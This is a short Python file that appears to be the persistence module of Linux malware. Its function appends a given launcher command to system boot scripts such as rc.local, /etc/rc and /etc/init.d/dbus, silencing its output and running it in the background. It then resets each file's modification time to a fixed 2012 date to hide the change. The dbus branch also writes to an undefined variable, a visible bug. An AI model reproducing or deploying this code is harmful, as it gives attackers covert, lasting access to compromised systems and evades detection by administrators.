#!/usr/bin/env python
import os

def add(path, launcher, launcher_args):
	if os.path.isfile("/etc/init.d/rc.local"):
		if path in open("/etc/init.d/rc.local").read():
			return
		else:
			with open("/etc/init.d/rc.local", "a") as local:
				local.write(path+" "+launcher+" "+launcher_args+' > /dev/null 2>&1 &')
			os.utime("/etc/init.d/rc.local",(1330712292,1330712292))
	elif os.path.isfile("/etc/rc"):
		if path in open("/etc/rc").read():
			return
		else:
			os.system("head -n-1 /etc/rc > /etc/rc2 && rm -f /etc/rc && mv /etc/rc2 /etc/rc")
			with open("/etc/rc", "a") as rc:
				rc.write(path+" "+launcher+" "+launcher_args+' > /dev/null 2>&1 &'+'\n')
				rc.write("exit 0")
			os.utime("/etc/rc",(1330712292,1330712292))
	elif os.path.isfile("/etc/rc.d/rc.local"):
		if path in open("/etc/rc.d/rc.local").read():
			return
		else:
			with open("/etc/rc.d/rc.local", "a") as rc2:
				rc2.write(path+" "+launcher+" "+launcher_args+' > /dev/null 2>&1 &')
			os.system("chmod +x /etc/rc.d/rc.local")
			os.utime("/etc/rc.d/rc.local",(1330712292,1330712292))
	elif os.path.isfile("/etc/init.d/dbus"):
		if path in open("/etc/init.d/dbus").read():
			return
		else:
			with open("/etc/init.d/dbus", "a") as dbus:
				cron.write(path+" "+launcher+" "+launcher_args+' > /dev/null 2>&1 &'+'\n')
			os.utime("/etc/init.d/dbus",(1330712292,1330712292))

